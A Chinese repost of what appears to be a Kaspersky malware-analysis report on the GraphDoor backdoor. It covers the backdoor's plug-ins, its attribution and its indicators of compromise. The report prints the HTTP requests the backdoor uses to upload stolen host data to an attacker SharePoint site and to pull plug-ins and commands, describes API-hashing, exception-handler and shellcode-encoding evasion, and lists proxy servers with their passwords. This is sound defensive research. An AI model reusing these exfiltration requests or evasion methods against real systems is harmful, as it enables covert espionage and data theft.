---
title: 【微信】“ShadowCloud行动”：基于云服务的后门，针对亚洲和非洲的政府网络。第二部分
source: https://mp.weixin.qq.com/s/JxsworMKvrCoL95ixFizSA
source_host: mp.weixin.qq.com
clip_date: 2026-11-19T11:42:48+08:00
trace_id: 6b2b1b10-beae-4888-8220-d64e0abf910f
content_hash: 6b3ff9a55865f4f8da34d9148853f95341246d7afe19d8b17777c312d90da9ee
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 3
  succeeded: 3
  failed_urls: []
notion_page_id: 41d75244-d011-815e-ab6d-d6ea1b4a37de
ioc:
  cves: []
  cwes: []
  hashes:
    - 14ec33ea808e697870d00c5e434c2952
    - 32151547d912488ac5242731057170a3
    - 45b3aa39bc33528650d9181cd946b2df
    - 733f8002aa9531b25384c0014d15cc1f
    - 86a46af43e18288e1df439b2a9a6f7ca
    - 91bee19d31d32346cd4d1febb4308606
    - 9a5e0ab7466594dcf46943c413db7b81
    - b4956b230d296cb4b015b42b11d80e32
    - d89b2fe0759df2d534e7a728700a6f8c
    - e9d4081fac4a5111e6856f333d490439
  domains: []
  tools: []
  techniques: []
---

**网络与信息安全参考** *2026年11月18日 08:00*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f2797408bacbb13c.jpg)

— 原文封面图。图片来源：Kaspersky Securelist

GReAT 研究 ｜ 作者：Saurabh Sharma、Noushin Shabab ｜ 2026 年 11 月 17 日 ｜ 原文：Securelist

QUOTE

后门不携带任何 C2 地址，指令被写进 SharePoint 里一份名为 main.xxxx.js.map 的“源码映射文件”。 合法 API 调用混在正常企业流量里 ，云端反倒成了最难识破的跳板。

—— 卡巴斯基 GReAT 团队

本文看点

01

GraphDoor 如何借 Microsoft Graph 收发指令

02

七个插件的能力与内存注入手法

03

与 FamousSparrow、CopperTurtle 的归因交叉

01

OVERVIEW

### 概述

本系列第一篇聚焦初始感染链，剖析了 GitDoor 后门的命令与控制（C2）协议，并梳理了攻击者投放到受害主机的各类 shellcode 家族。本篇将完整走过 GraphDoor 后门及其加载的整套插件——包括经改写的 Erfrp 与 Ably 代理插件——并给出把该行动与 中文语言威胁组织 关联起来的归因线索。

02

GRAPHDOOR

### GraphDoor（MD5 14ec33ea808e697870d00c5e434c2952）

恶意程序的第一步是打开一个命名管道，供后续通信复用。管道名由 **自身 PID** 拼成，形式为 \\\\.\\pipe\\p%lu（其中 %lu 是以无符号长整型表示的进程 ID）。当后门连接上 C2 服务器并下载所需插件后，这些插件会把状态报告写入同一个管道。

管道建立完成后，后门在系统的 Application Data 目录下创建名为 Intel_Log 的文件夹。在该文件夹内，它再生成一个以随机 GUID 命名的子目录，最终形成类似 C:\\ProgramData\\Intel_Log\\<random-GUID> 的完整路径。

接下来，恶意程序开始采集系统信息，准备回传给攻击者。它在运行时用 **DJB2 算法** 对 DLL 名与函数名做哈希，以此解析所需的 Windows API。为了隐蔽地调用这些 API，后门注册了一个 **向量化异常处理程序（vectored exception handler）**，其中内置一段用于目标调用的微型例程，随后故意触发异常；处理程序捕获异常、执行该例程，从而完成对目标 API 的调用。借助这种间接调用技术，恶意程序从受害主机上收集以下信息：

网络适配器详情

操作系统版本

为受感染主机随机生成的 GUID

公网 IP

内网 IP

用户名

主机名

当前目录（后门被执行时所在的位置）

自身模块的 PID

所有正在运行的进程列表

除受害主机信息外，后门还会解密一组内置配置参数（见下方列表），并将其附加到受害数据之后。合并后的信息随后用 AES 加密、Base64 编码，再发送至 C2 服务器。

...conf

"type":"serv"

"client_version":"1.2.7"

"dhj_exe":"javaw.exe"

"execution_method":"normal"

"is_need_lock":"false"

恶意程序首先与 login.microsoftonline.com 的 **443 端口** 建立 TLS 连接。TLS 握手完成后，它解密三段硬编码的 AES 加密字符串，这些值构成认证请求的各个组成部分：

UUID 路径段

客户端 ID（应用注册）

客户端密钥

它还会生成随机的 X-CSRF-TOKEN，解密一段预置的 User-Agent 字符串以及其他若干硬编码字符串，然后向 login.microsoftonline.com 发起 POST 请求（示例如下）。这次调用认证的对象是恶意应用本身，而非某个用户，返回的访问令牌随后被后门用于与 Microsoft Graph API 通信。

...http

POST /8f50c589-a4d6-4df4-95bb-2fb7f5983fe5/oauth2/v2.0/token HTTP/1.1

Host: login.microsoftonline.com

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %Randomly generated value%

Content-Length: %size of the data%

Content-Type: application/x-www-form-urlencoded

Connection: close

"client_id=<redacted>&scope=https://graph.microsoft.com/.default&grant_type=client_credentials&client_secret=<redacted>"

若认证成功并取得访问令牌，后门会为 X-CSRF-TOKEN 头重新生成一个随机值，随后连接 graph.microsoft.com。它发出一个 **Microsoft Graph PUT 请求**，在某个 SharePoint 文档库中创建名为 main.%victim-unique-code%.js.map 的文件，伪装成 JavaScript source map 文件。占位符 %victim_unique_code% 是随机生成的八位字母数字串。放在 PUT 请求体中的加密受害数据，就存储在该 SharePoint 驱动器的这个文件里。

...http

PUT /v1.0/sites/buildersemp.sharepoint\[.\]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab/drives/b!6T_Ru3F5kUCFtBnhmgLw07MlWGFETDpHjoUHqeJ5AKv5tFfD8L_sSp8lOvFe6wi\_/root:/main.%victim_unique_code%.js.map:/content HTTP/1.1

Host: graph.microsoft.com

Authorization: %Access token received from the previous step%

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %randomly generated string%

Content-Length: %size of the data to be uploaded%

Content-Type: application/json

Connection: close

{"message":"commit from INSOMNIA","content":"%base64-encoded encrypted victim information%"}

上述 PUT 请求的路径可拆解如下：

/sites/：访问 SharePoint 站点

**sharepoint\[.\]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab**：站点标识符； **buildersemp.sharepoint\[.\]com** 为 SharePoint 域名／网站

/drives/：访问站点内的文档库（drives）

**b!6T_Ru3F5kUCFtBnhmgLw07MlWGFETDpHjoUHqeJ5AKv5tFfD8L_sSp8lOvFe6wi\_**：驱动器 ID

**root:/main.%victim_unique_code%.js.map:/content**：以动态文件名将文件上传至根目录

随后，恶意程序从服务器上拉取三个插件模块。下表列出了它们存放在 SharePoint 上的对应文件名。

...text

scr.ts: screenshot capturing

pr.ts: process listing

kl.ts: keylogger

对每个插件，恶意程序都会 **单独启动一个线程**，使下载过程并行推进、互不阻塞。拉取完成后，插件使用与 GitDoor 变种相同的例程解密。

为了下载截图采集插件，后门构造如下 HTTP GET 请求：

...http

GET /v1.0/sites/buildersemp.sharepoint\[.\]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab/lists/dd27e665-bef6-4de1-b28f-280c0af4593f/items?select=id,fields&expand=fields(select=Title,text,Modified,Created)&filter=startswith(fields/Title,'scr.ts') HTTP/1.1

Host: graph.microsoft.com

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

Content-Type: application/json

Connection: close

对于键盘记录插件，后门会先检查文件 C:\\Users\\analyst\\AppData\\Roaming\\log.lock 是否存在。只有在 **该文件存在** 的情况下，它才会使用下述 GET 请求下载插件：

...http

GET /v1.0/sites/buildersemp.sharepoint\[.\]com,bbd13fe9-7971-4091-85b4-19e19a02f0d3,615825b3-4c44-473a-8e85-07a9e27900ab/lists/dd27e665-bef6-4de1-b28f-280c0af4593f/items?select=id,fields&expand=fields(select=Title,text,Modified,Created)&filter=startswith(fields/Title,'kl.ts') HTTP/1.1

Host: graph.microsoft.com

Accept: application/json

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: %random string%

Content-Type: application/json

Connection: close

下载插件的请求通过 Microsoft Graph API **v1.0** 端点，指向某个 SharePoint 站点上的特定列表。请求中包含若干用于筛选和调整响应结构的参数，具体如下：

buildersemp.sharepoint\[.\]com：SharePoint 网站

**dd27e665-bef6-4de1-b28f-280c0af4593f**：列表 ID

**$select=id,fields**：仅返回 id 字段与 fields 对象

**select=Title,text,Modified,Created)**：展开 fields 对象，纳入指定列：Title、text、Modified 与 Created

**$filter=startswith(fields/Title,'kl.ts')**：筛选 Title 字段以 “ts”、“scr.ts” 或 “pr.ts” 开头的结果

三个插件模块取回后，恶意程序重新与服务器建立联系以获取指令。它随即发送一个请求（如下所示），列出 SharePoint 网站上针对该受害主机的命令文件。

...http

GET /v1.0/sites/buildersemp.sharepoint\[.\]com,7700c47b-4999-4cc6-acc5-9a3c7559c34b,66f393a9-0c1a-4d9a-aa2f-27d7293a642d/lists/8c219ab1-58bf-4752-ba7b-a8e7b73bdbb8/items?select=id,fields&expand=fields(select=Title,Modified,Created)&filter=startswith(fields/Title,'main.%unique_victim_code%') HTTP/1.1

Connection: Keep-Alive

Content-Type: application/json

Accept: application/json

Authorization: %token%

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

X-CSRF-TOKEN: OpB9ZzK4rlfyCGO72mEgBqROv7jr5pUVZ

Host: graph.microsoft.com

上述请求从 SharePoint 列表中检索条目，选取 Title 以 main.%unique_victim_code% 开头的文件——也就是发给由 %unique_victim_code% 标识的这台受害主机的命令文件。

/lists/：定位站点内的一个列表

**8c219ab1-58bf-4752-ba7b-a8e7b73bdbb8**：待查询列表的 GUID

/items：该列表内的列表项（行）集合

**$select=id,fields**：仅返回每个条目的 id 与 fields 属性

**select=Title,Modified,Created)**：展开 fields 导航属性，使所选子属性出现在响应中，只取 Title、Modified、Created 三列

**$filter=startswith(fields/Title,'main.%unique_victim_code%')**：仅保留 Title 列以字面文本 %unique_victim_code% 开头的列表项

上述请求的响应是一个由命令文件组成的 JSON 数组，如下所示。后门会将每个文件的扩展名与一份允许清单（.js、.swp、.tmp、.kmap、.pmap、.apmap）逐一比对。一旦命中，它就下载对应的命令文件，并按 GitDoor 变种所述的方式执行其中的命令。

...json

"value": \[

{

"@odata.etag": "\\"bffa96c9-8ce2-4047-96c7-75f648ce7cec,1\\"",

"id": "2145",

"fields@odata.context": "https://graph.microsoft.com/v1.0/$metadata#sites('buildersemp.sharepoint.com%2Cea78ecdb-13c6-471d-977e-9472d8eb3a1c%2C0c4a2edf-cfc5-468e-91f1-4845efbededf')/lists('d23978b8-cb90-4e0b-bcbd-c9347ae1bedb')/items('2145')/fields(Title,Modified,Created)/$entity",

"fields": {

"@odata.etag": "\\"bffa96c9-8ce2-4047-96c7-75f648ce7cec,1\\"",

"Title": "main.4rSKjLE7.sn35.js",

"Modified": "2026-09-01T09:02:11Z",

"Created": "2026-09-01T09:02:11Z"

}

},...

\]

GraphDoor 内置的命令与 GitDoor 变种中的命令大体相同。不过在「**Load Shellcode**」类别下，我们额外识别出两条命令：shell 与 adsmload。

| 命令类型 | 额外支持的命令 |
| --- | --- |
| Load Shellcode | **shell**：以 cmd.exe /C <command_string> 执行传入的命令。<br><br>**adsmload**：与 smload 命令非常相似，区别在于 payload 与可选输入参数会先格式化为 ASCII MAC 地址，再做 Base64 编码。Base64 字符串解码后，这些 ASCII MAC 地址编码的字符串通过 RtlEthernetStringToAddressA 还原为原始二进制字节。最终 payload 字节可能是 MZ 可执行文件，也可能是 shellcode（由 stub 与可执行代码组成），二者均被注入内存。payload 参数同样经过 Base64 解码、ASCII MAC 地址解码，然后写入名为 Local\\sm<%current_process_id%> 的共享内存段。 |

03

PLUG-INS

### 插件

一个插件由一小段加载器 stub 和紧随其后的 **COFF（Common Object File Format，通用目标文件格式）** 对象组成。加载器 stub 在二进制中搜索标记字节序列 \\x1C\\x3F\\xE6\\xE9；该标记之后的内容才是真正的 COFF payload。这份 payload 只保留执行所需的核心要素：节数量、节头、原始节代码以及符号信息。

stub 会申请一段可执行内存，把节代码复制进该缓冲区，并完成必要的重定位。最后，stub 在 COFF 对象中找到名为 go 的入口点函数并调用它，插件由此开始运行。

键盘记录器（kl.ts）

键盘记录器把数据写入 %APPDATA%\\Microsoft\\SystemCertificates\\Cache\\logs.dat。启动时它先生成一个随机 **32 字节 XOR 密钥**，用于在原始击键数据追加进 logs.dat 之前对其进行加密。这个随机 XOR 密钥并不以明文留存，它自身还会与一段硬编码的 32 字节密钥（DE DD 8C AC 75 45 93 38 34 B3 17 5B BF C5 37 5D DD 09 52 F7 A7 9F F3 47 1D 55 A6 14 0E BA 05 E5）做 XOR 掩码。加密后的密钥字节被写入日志文件，其后跟随一个单字节校验和，取值为这些字节之和截断到一个字节。

在加密密钥之后，还会写入一个固定的 **32 字节标记** （53 4D C2 A1 3F 95 26 B7 2C 54 86 9A 02 87 A9 08 70 4B 5D B9 75 DD 8B 03 4B 0A 2B 89 25 CC E7 B1），用于标示键盘记录器数据的起始位置。如果该插件被再次启动且日志文件已存在，那么在任何新的 XOR 加密击键写入之前，只需再次前置同一段标记序列。

随后，键盘记录器安装 **低级键盘钩子与鼠标钩子**。两个钩子都成功装载后，它向控制台输出：bof-keylogger###keyLog start success, mouseLog start success。此外，恶意程序还创建一个名为 keylogger###Global\\OneDriveStandaloneUpdater{%X-%X} 的命名对象；当该对象收到信号，会触发一段例程，翻转标志位以停止记录，并打印：bof-keylogger###stop。最终，记录下的击键以上述 XOR 加密格式写入 logs.dat。

...text

"W:\[%s (%04u-%02u-%02u %02u:%02u:%02u)\],<virtual key code>,<mouse coordinates>"

%s: window text (e.g., window title)

%04u-%02u-%02u %02u:%02u:%02u: UTC timestamp in the form YYYY-MM-DD HH:MM:SS

Virtual key code represented as %lu (an unsigned long integer)

Mouse coordinates formatted as %s%ld\_%ld, where %s is the mouse-event code and %ld are the x and y positions. Mouse events can be MLD (Mouse Left Button Down), MLU (Mouse Left Button Up), MRD (Mouse Right Button Down), MRU (Mouse Right Button Up), MMD (Mouse Middle Button Down), MMU (Mouse Middle Button Up), and MWH (Mouse Wheel Scroll Event).

上述格式各字段的中文含义：%s 为窗口文本（例如窗口标题）；%04u-%02u-%02u %02u:%02u:%02u 为形如 YYYY-MM-DD HH:MM:SS 的 UTC 时间戳；虚拟键码以 %lu（无符号长整型）表示；鼠标坐标格式为 %s%ld\_%ld，其中 %s 是鼠标事件代码，%ld 为 x、y 坐标。鼠标事件包括 MLD（左键按下）、MLU（左键抬起）、MRD（右键按下）、MRU（右键抬起）、MMD（中键按下）、MMU（中键抬起）与 MWH（滚轮滚动事件）。

...text

Example

W:\[Search (2026-07-10 09:03:40)\],91,91+82,W:\[Run (2026-07-10 09:03:43)\],MLD945_1049,MLU945_1049

进程枚举（pr.ts）

该插件收集系统上正在运行的进程信息。它首先获取 SeDebugPrivilege 特权，然后枚举每一个活动进程。每个进程按以下格式记录：

...text

bof-process###%d###%d###%s###%s###%d###%s\\%s###

%d: process ID

%d: parent process ID

%s: process executable name

%s: x64 or x86 process

%d: session ID under which the specified process is running

%s\\%s: DomainName\\UserAccountName

字段说明：%d 为进程 ID；%d 为父进程 ID；%s 为进程可执行文件名；%s 标识该进程是 x64 还是 x86；%d 为该进程运行所在的会话 ID；%s\\%s 为 域名\\用户账户名。

...text

Example

bof-process###484###2804###msedge.exe###x64###1###n00b-PC\\n00b###

收集完运行中进程的信息后，插件连接到后门创建好的既有管道 \\\\.\\pipe\\p%lu（其中 %lu 为后门的进程 ID，以无符号长整型表示）。连接成功后，它把收集到的进程信息写入该管道。

屏幕截图（scr.ts）

该插件扫描屏幕上的每一个 **顶层窗口**，并将各窗口所属进程 ID 与传入的进程 ID 逐一比对。当找到进程 ID 匹配且窗口可见的目标时，就对那个窗口截图。图像随后编码为 JPEG、转为 Base64 字符串，前置标记 bof-screenshot###，再通过既有命名管道 \\\\.\\pipe\\p%lu（其中 %lu 为后门自身进程 ID）发送出去。如果传入的进程 ID 为零，代码改为截取整个桌面。

目录迁移（moveDir.ts）

该插件把合法可执行文件、恶意加载器 DLL 以及加密的后门文件（config.ini）迁移到指定的目标路径。它先比较传入的目标文件路径与当前后门文件路径。若两者不同，就创建目标目录（若尚不存在），随后把合法可执行文件复制到目标路径。之后，插件遍历一份预定义的加载器 DLL 名单，如下所示。

...text

python311.dll, SbieDll.dll, jli.dll, libcef.dll, krita.dll, nvdaHelperRemote.dll, AppVIsvSubsystems64.dll, winmm.dll, CoreFoundation.dll, vcruntime140.dll, msvcp140.dll, snmpapi.dll, MSIMG32.dll, version.dll, sqlite.dll, msedge_elf.dll, python39.dll, python38.dll, python33.dll

插件会把当前后门路径下 **实际存在的** 每一个加载器 DLL 复制到目标路径。最后，加密的后门文件（config.ini）同样从当前路径复制到目标路径。当合法可执行文件、加载器 DLL 与加密 payload 文件都成功复制到目标路径后，程序便从目标路径启动那个合法可执行文件。若进程创建成功，插件会创建一个名为 Global\\ExitEvent 的退出事件，并等待该事件被置位或触发。事件被置位后，插件休眠 **8 秒**，然后终止当前的后门进程（即旧的实例）。

若目标路径与当前路径相同，插件则枚举所有运行中的进程，取出后门父进程的可执行文件名。当后门名称与其父进程名称一致时，它触发 Global\\ExitEvent 事件，暂停 **7 秒** 后终止父进程，再间隔 **1 秒** 检查删除文件标志。若该标志已置位，则从父进程所在路径删除父进程的可执行文件、加密后门文件（config.ini）以及加载器 DLL。

代理通道（channel.ts）

该插件由引导代码（与其他插件使用的 stub 代码不同）和一个编译好的 Go 可执行文件（而非目标文件）组成。引导代码通过 **反射式加载** 把 Go 二进制注入当前进程的地址空间，其工作方式与 Type 1 加载器 jli.dll（MD5：e9d4081fac4a5111e6856f333d490439）十分相似。被注入的 Go 程序（MD5：d89b2fe0759df2d534e7a728700a6f8c）充当代理客户端，派生自开源反向代理项目 **Erfrp**。

在二进制内部可以找到一条路径字符串，它透露出攻击者的开发环境与意图：C:/Users/user/Desktop/pythonrat/proxytest/Erfrp-0.1/frpc.go。原始 Erfrp 源码已被改造，不再读取配置文件，而是从名为 Local\\pc<current-process-ID> 的共享内存段获取配置。客户端会把该段的内容转换为字符串，并按以下方式解释：

若字符串为 True、False 或 connecting，客户端向共享内存写回 False，休眠两秒后再次检查该内存。

若字符串包含完整的代理客户端配置，客户端便解析这些参数，并用解析出的配置启动一个快速反向代理会话。

Ably 通道（abchannel.ts）

该插件由引导代码和一个编译好的 Go 可执行文件组成。引导代码把 Go 可执行文件反射式注入当前进程内存，作用与 Type 1 加载器 jli.dll（MD5：e9d4081fac4a5111e6856f333d490439）类似。

被注入的 Go 程序（MD5：b4956b230d296cb4b015b42b11d80e32）带有硬编码的项目路径 C:/Users/user/Desktop/armon/server.go，该路径很可能指向攻击者的开发环境。进入内存后，这个二进制程序以官方 Go SDK 充当 **Ably 实时消息服务** 的客户端，并按以下步骤接入 Ably 消息服务。

1

**读取配置**：客户端从命名共享内存段 Local\\pcs<%PID%>（其中 %PID% 为当前进程 ID）读取前 4096 字节，并将原始字节转为 UTF-8 字符串。

2

**提取令牌与通道名**：若该字符串包含关键字 “Token”，就按 JSON 解析，取出两个字段——Ably JWT 令牌（用于认证）与通道名（将用于通信的 Ably 通道）。

3

**建立连接**：构造形如 cli-<%PID%> 的客户端 ID，提供 JWT 令牌，与 Ably 建立一条安全的实时连接。随后程序在所选的通道上订阅两个事件：json 与 json.send。

4

**就绪信号**：订阅成功后，插件把字符串 “True” 写回共享内存段，并静默记录一条 “File proxy server started…” 消息。

5

**轮询循环**：插件每秒重新读取一次共享内存段。若值变为 “False”，则平缓断开 Ably 连接。

**消息处理** 机制如下表所示。

| 事件  | 客户端行为 |
| --- | --- |
| json | 消息按分隔符 ###!!### 拆分。第一部分必须是字面字符串 json；第二部分是 Base64 编码的主机名。客户端解码主机名，向其打开一个 TCP socket，并从该 socket 读取最多 **45 KB** 数据。数据经 Base64 编码后封装为 <event>.resp.<RANDOM>.###!!###<base64>，其中 <event> 为原始令牌（json），<RANDOM> 是 0 到 10,000 之间的随机整数。这条新消息（json.resp）随后被发布回同一个 Ably 通道。 |
| json.send | 消息同样按 ###!!### 拆分。第二部分是 Base64 编码的数据。解码后，payload 被写入先前为 json 请求打开的那个 TCP socket。客户端持续写入，直到收到特殊标记 ###EOF### 为止。 |

Ably2 通道（ab2channel.ts）

该插件是一个隐蔽的 **SOCKS5 代理**，把任意 TCP 流量通过 Ably 兼容 Pusher 的 WebSocket 服务隧道传输。插件是编译好的 Windows 可执行文件，其执行从 “ **MZ** ” 字节开始——这两个字节充当 **跳板代码（trampoline）**，把控制流重定向到引导代码。引导代码的功能与 Type 1 加载器 jli.dll（MD5：32151547d912488ac5242731057170a3）中所用的类似。

该插件需要三个配置参数： **Ably APP_KEY**、 **APP_SECRET** 与 **instance_id**。拿到这些值后，它向 Ably 兼容 Pusher 的端点打开一条安全 WebSocket 连接：

...text

wss://main.pusher.ably.net/app/<APP_KEY>?protocol=7&client=cpp-socks5

Use Pusher Channels protocol version 7

The connecting application identifies itself as cpp-socks5.

连接串说明：使用 Pusher Channels 协议第 7 版；发起连接的应用程序自称 cpp-socks5。

插件使用两个私有通道分别承载请求与响应，二者均由 instance_id 派生：

请求通道：private-socks5-<instance_id>-request

响应通道：private-socks5-<instance_id>-response

客户端用 APP_SECRET 为每个请求签名以证明身份，并订阅请求通道。它等待三种可能的消息类型：

| 消息名 | 预期 payload | 采取的动作 |
| --- | --- | --- |
| socks5:connect | { “session_id”: n, “host”: “…”, “port”: … } | 向给定的 host/port 打开新的 TCP socket，创建以 session_id 标识的会话，并开始从该 socket 读取数据。从远端 TCP socket 读到的数据按 **0x8400 字节（33,792 字节）** 分块，每块经 Base64 编码、包进一个 JSON 对象，再发布回响应通道。 |
| socks5:data | { “session_id”: n, “payload”: “<base64>” } | 解码 Base64 payload，并把得到的字节写入此前为对应会话打开的 socket。 |
| socks5:close | { “session_id”: n } | 平缓关闭该会话对应的 socket，并释放相关资源。 |

04

ATTRIBUTION

### 归因

目前我们掌握的信息尚不足以把该活动 **明确归属** 到某个特定威胁组织。不过，我们观察到它与 **FamousSparrow**、 **CopperTurtle** 等中文语言威胁组织的活动存在重叠（关于这些组织的详细报告仅向我们的私有报告服务客户提供）。在若干受害系统上，这些组织与 GitDoor 后门共用同一批暂存目录，且其植入体与 GitDoor 的部署时间相差不超过 **一天**。

这并不能证明存在直接关联，但提示某个中文语言组织可能正在开发，和/或使用 GitDoor 与 GraphDoor 这两个后门。

在 FamousSparrow 行动中，攻击者执行了 excint.exe（MD5：86a46af43e18288e1df439b2a9a6f7ca），它是 **Avast 杀毒软件** 组件改名后的副本（位于 %ProgramData%\\excint\\）。该程序侧加载了恶意 DLL %ProgramData%\\excint\\wtsapi32.dll（MD5：733f8002aa9531b25384c0014d15cc1f）。这个恶意的 wtsapi32.dll 会从同目录下与合法可执行文件同名的文件（excint）中读取加密 payload，并用硬编码密钥 iotrh^%4CFGTj 做 **RC4 解密**——该密钥此前已被确认由 FamousSparrow APT 使用。

| 威胁行为体 | 暂存目录 | 创建日期 |
| --- | --- | --- |
| FamousSparrow | %ProgramData%\\excint\\excint.exe<br><br>%ProgramData%\\excint\\wtsapi32.dll（MD5：733f8002aa9531b25384c0014d15cc1f） | 2026.03.06 |
| GitDoor 后门 | %ProgramData%\\excInt\\sg\\zoomit.exe<br><br>%ProgramData%\\excint\\sg\\WINMM.dll（MD5：91bee19d31d32346cd4d1febb4308606） | 2026.03.05 |

在 CopperTurtle 案例中，攻击者启动了恶意可执行文件 C:\\Program Files\\PDF24\\pdfset.exe（MD5：45b3aa39bc33528650d9181cd946b2df），该文件会把 **PLEAD RAT** 注入内存。

| 威胁行为体 | 暂存目录 | 创建日期 |
| --- | --- | --- |
| CopperTurtle | C:\\Program Files\\PDF24\\pdfset.exe（MD5：45b3aa39bc33528650d9181cd946b2df） | 2026.05.03 |
| GitDoor 后门 | C:\\Program Files\\PDF24\\pdf.exe<br><br>C:\\Program Files\\pdf24\\SbieDll.dll（MD5：9a5e0ab7466594dcf46943c413db7b81） | 2026.05.04 |

05

INFRASTRUCTURE

### 基础设施

该后门 **并未内置** 硬编码的 C2 域名，而是通过代理通道插件的 info 命令，或经由 Ably 消息通道获取 C2 主机名与端口，从而避免 C2 域名信息被直接捕获。IP 地址 103\[.\]106\[.\]230\[.\]33 与 123\[.\]58\[.\]205\[.\]105 分别解析到域名 ms\[.\]twnic\[.\]top 与 ekmt\[.\]tw。这两个域名（twnic\[.\]top、ekmt\[.\]tw）同时也被用作 **Cobalt Strike beacon 的 C2 服务器**，相关 beacon 样本部署在已感染 GraphDoor 后门的受害主机上。

| 代理服务器地址 | 代理用户名 | 代理密码 | 域名  | ASN |
| --- | --- | --- | --- | --- |
| 104\[.\]194\[.\]154\[.\]28 | NA  | NA  | NA  | AS 14956 (RouterHosting LLC) |
| 216\[.\]73\[.\]158\[.\]72 | NA  | NA  | NA  | AS 53724 (EXTRAVM LLC) |
| 122\[.\]147\[.\]252\[.\]16 | NA  | NA  | NA  | AS 9919 (New Century InfoComm Tech Co., Ltd.) |
| 103\[.\]106\[.\]230\[.\]33 | google | 1qaz2wsx-pl | ms\[.\]twnic\[.\]top | AS 136258 (BrainStorm Network, Inc) |
| 123\[.\]58\[.\]205\[.\]105 | google | 1qaz2wsx-pl | ekmt\[.\]tw | AS 135377 (UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED) |
| 223\[.\]165\[.\]4\[.\]203 | admin123 | 1qaz@WSX!@# | NA  | AS 136258 (BrainStorm Network, Inc) |
| 172\[.\]86\[.\]66\[.\]19 | NA  | NA  | NA  | AS 14956 (RouterHosting LLC) |
| 103\[.\]214\[.\]68\[.\]20 | aaa | zzljq6Qj | NA  | AS 53724 (EXTRAVM LLC) |
| 216\[.\]146\[.\]25\[.\]173 | NA  | NA  | NA  | AS 63018 (Dedicated.com) |
| 103\[.\]137\[.\]63\[.\]39 | xyz | abc | NA  | AS 131642 (Pittqiao Network Information Co., Ltd.) |
| 103\[.\]227\[.\]224\[.\]189 | whatfuck | BQdTQYer123123 | NA  | AS 148996 (GLOBAL COMMUNICATION NETWORK LIMITED) |
| 104\[.\]194\[.\]152\[.\]173 | abc | abc | NA  | AS 14956 (RouterHosting LLC) |
| 66\[.\]42\[.\]52\[.\]137 | abc user | abc IKtxbUi7 | NA  | AS 20473 (The Constant Company, LLC) |
| 153\[.\]75\[.\]94\[.\]148 | abc | abc | NA  | AS 14956 (RouterHosting LLC) |
| 45\[.\]59\[.\]124\[.\]164 | abc | abc | NA  | AS 14956 (RouterHosting LLC) |
| 104\[.\]194\[.\]153\[.\]161 | abc abc | abc rrVa8mhb | NA  | AS 14956 (RouterHosting LLC) |
| 153\[.\]75\[.\]95\[.\]27 | NA  | NA  | NA  | AS 14956 (RouterHosting LLC) |
| 216\[.\]73\[.\]158\[.\]117 | abc | abc | NA  | AS 53724 (EXTRAVM LLC) |
| 154\[.\]205\[.\]154\[.\]209 | NA  | NA  | NA  | AS 154177 (LIGHT NODE LIMITED) |
| 43\[.\]134\[.\]62\[.\]111 | NA  | NA  | NA  | AS 132203 (Tencent Building, Kejizhongyi Avenue) |
| 38\[.\]54\[.\]17\[.\]113 | NA  | NA  | NA  | AS 154177 (LIGHT NODE LIMITED) |
| 38\[.\]52\[.\]17\[.\]113 | NA  | NA  | NA  | AS 33152 (Kit Carson Electric Cooperative, Inc) |

06

CONCLUSION

### 结论

Operation ShadowCloud 的发现揭示出一套成熟、模块化的威胁基础设施：它把 **Microsoft SharePoint、GitHub 与 Ably 这些合法云平台** 当作隐蔽的 C2 通道。借助云存储与消息服务，攻击者得以混入正常流量——因为发往 Microsoft Graph、GitHub 和 Ably 的云 API 调用与合法企业使用无法区分，从而绕过大量基于网络的检测手段。

这套架构还实现了 **动态载荷投递**：按需从云端仓库取回插件与 shellcode，无需修改主机上的文件就能快速更新、扩展功能。

截至本文撰写时，威胁行为体最初如何投放 **MeshCentral Agent** 仍不清楚。但把这类合法工具引入环境本身就该被视为可疑事件——尽管它们有正当用途，却早已被全球不同类型的威胁行为体滥用。

07

INDICATORS OF COMPROMISE

### 入侵指标（IoC）

GraphDoor

...md5

14ec33ea808e697870d00c5e434c2952

SharePoint 站点

...domain

buildersemp\[.\]sharepoint\[.\]com

cskautogo\[.\]sharepoint\[.\]com

代理 C2 服务器

...ip

104\[.\]194\[.\]154\[.\]28

216\[.\]73\[.\]158\[.\]72

122\[.\]147\[.\]252\[.\]16

103\[.\]106\[.\]230\[.\]33

123\[.\]58\[.\]205\[.\]105

223\[.\]165\[.\]4\[.\]203

172\[.\]86\[.\]66\[.\]19

103\[.\]214\[.\]68\[.\]20

216\[.\]146\[.\]25\[.\]173

103\[.\]137\[.\]63\[.\]39

103\[.\]227\[.\]224\[.\]189

104\[.\]194\[.\]152\[.\]173

66\[.\]42\[.\]52\[.\]137

153\[.\]75\[.\]94\[.\]148

45\[.\]59\[.\]124\[.\]164

104\[.\]194\[.\]153\[.\]161

153\[.\]75\[.\]95\[.\]27

216\[.\]73\[.\]158\[.\]117

154\[.\]205\[.\]154\[.\]209

43\[.\]134\[.\]62\[.\]111

38\[.\]54\[.\]17\[.\]113

38\[.\]52\[.\]17\[.\]113

Cobalt Strike 域名

...domain

twnic\[.\]top

ekmt\[.\]tw

SOURCE

